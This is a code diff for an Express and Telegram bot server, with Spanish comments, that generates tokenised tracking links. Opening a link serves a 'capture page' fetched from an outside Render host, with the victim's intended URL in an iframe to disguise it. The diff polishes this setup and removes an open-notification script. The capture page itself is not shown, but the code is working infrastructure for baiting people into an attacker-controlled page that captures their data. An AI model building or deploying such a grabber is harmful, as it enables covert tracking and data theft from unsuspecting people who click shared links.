@@ -1,10 +1,12 @@
 const express = require('express');
 const { Telegraf } = require('telegraf');
 const crypto = require('crypto');
+const fetch = require('node-fetch');
 const fs = require('fs');
 const path = require('path');
 
 const app = express();
+app.use(express.json());
 const PORT = process.env.PORT || 3000;
 
 // ========== TOKEN ==========
@@ -24,7 +26,6 @@ function generateToken() {
     return crypto.randomBytes(6).toString('hex');
 }
 
-// ========== GENERA ENLACE ==========
 function createTrackLink(originalUrl, chatId) {
     const token = generateToken();
     tokens[token] = { 
@@ -33,7 +34,9 @@ function createTrackLink(originalUrl, chatId) {
         chatId: chatId
     };
     const baseUrl = process.env.BASE_URL || 'https://mi-bot-clon.onrender.com';
-    return `${baseUrl}/track/${token}`;
+    // ⚠️ Quita cualquier barra al final de la baseUrl
+    const cleanBase = baseUrl.replace(/\/+$/, '');
+    return `${cleanBase}/track/${token}`;
 }
 
 // ========== RUTA QUE MUESTRA TU PÁGINA DE CAPTURA CON IFRAME ==========
@@ -42,42 +45,35 @@ app.get('/track/:token', async (req, res) => {
     const data = tokens[token];
     
     if (!data) {
-        return res.status(404).send('Enlace no válido o expirado');
+        return res.status(404).send(`
+            <h1>🔴 Enlace no válido</h1>
+            <p>El enlace que intentas abrir no existe o ha expirado.</p>
+            <p>Genera uno nuevo desde el bot de Telegram.</p>
+        `);
     }
     
-    // La URL que el usuario quiere clonar
     const targetUrl = data.url;
     
-    // 🔥 Leer tu página de captura (debes tenerla en el servidor)
-    // Si no la tienes, usa la URL directamente con fetch
     try {
-        // Opción 1: Si tienes el HTML guardado localmente
-        // let html = fs.readFileSync(path.join(__dirname, 'pagina-captura.html'), 'utf8');
+        // 🔥 INTENTAR LEER EL HTML LOCAL (si existe)
+        let html;
+        try {
+            html = fs.readFileSync(path.join(__dirname, 'pagina-captura.html'), 'utf8');
+        } catch (e) {
+            // Si no existe, descargarlo desde la URL
+            const response = await fetch('https://karkstrck.onrender.com/');
+            html = await response.text();
+        }
         
-        // Opción 2: Descargar tu página de captura desde tu URL (recomendado)
-        const fetch = require('node-fetch');
-        const response = await fetch('https://karkstrck.onrender.com/');
-        let html = await response.text();
-        
-        // ========== INYECTAR EL IFRAME EN TU PÁGINA ==========
-        // Buscar dónde insertar el iframe (por ejemplo, después del div .card)
+        // ========== INYECTAR EL IFRAME ==========
         const iframeHtml = `
         <div style="margin-top:20px; border:1px solid #ccc; border-radius:8px; overflow:hidden;">
             <iframe src="${targetUrl}" style="width:100%; height:400px; border:none;"></iframe>
         </div>
         `;
         
-        // Insertar el iframe después del botón (o donde quieras)
+        // Insertar el iframe después del div .card (o donde quieras)
         html = html.replace('</div>', iframeHtml + '</div>');
-        
-        // 🔥 Agregar un script para notificar que la página se abrió (opcional)
-        const notifyScript = `
-        <script>
-            // Notificar al servidor que la página fue abierta
-            fetch('/track-opened/${token}', { method: 'POST' }).catch(() => {});
-        </script>
-        `;
-        html = html.replace('</body>', notifyScript + '</body>');
         
         res.send(html);
         
@@ -85,13 +81,6 @@ app.get('/track/:token', async (req, res) => {
         console.error('Error al cargar la página de captura:', error);
         res.status(500).send('Error al cargar la página de captura');
     }
-});
-
-// ========== RUTA PARA SABER CUÁNDO SE ABRE UN ENLACE (OPCIONAL) ==========
-app.post('/track-opened/:token', (req, res) => {
-    const token = req.params.token;
-    console.log(`🔍 Enlace ${token} fue abierto`);
-    res.send('OK');
 });
 
 // ========== RUTA PRINCIPAL ==========
